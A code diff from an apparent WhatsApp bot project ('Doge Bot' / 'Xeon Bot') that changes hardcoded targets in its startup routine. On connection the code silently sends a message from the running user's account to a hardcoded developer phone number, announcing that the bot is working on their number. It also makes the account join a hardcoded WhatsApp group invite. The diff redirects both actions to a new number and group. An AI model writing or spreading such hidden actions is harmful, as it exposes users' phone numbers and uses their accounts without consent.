@@ -42,7 +42,7 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     console.log(color('[DOGE BOT]'), color('Doge Bot Is Online', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
     console.log(color('<>','red'), color('Thanks For Using Doge Bot', 'white'))
-	DogeXeonOP.browserDescription = [ 'Subscribe Abhilash', 'chrome', '3.0' ]
+	DogeXeonOP.browserDescription = [ 'Subscribe Xeon', 'chrome', '3.0' ]
     DogeXeonOP.on('qr', () => {
         console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
     })
@@ -55,10 +55,10 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`918260349917@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
-    teks = `https://chat.whatsapp.com/DV8fYAR74tJI8Mb5CpsWGD`
+    teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
     DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
     
     await DogeXeonOP.connect({timeoutMs: 30*1000})
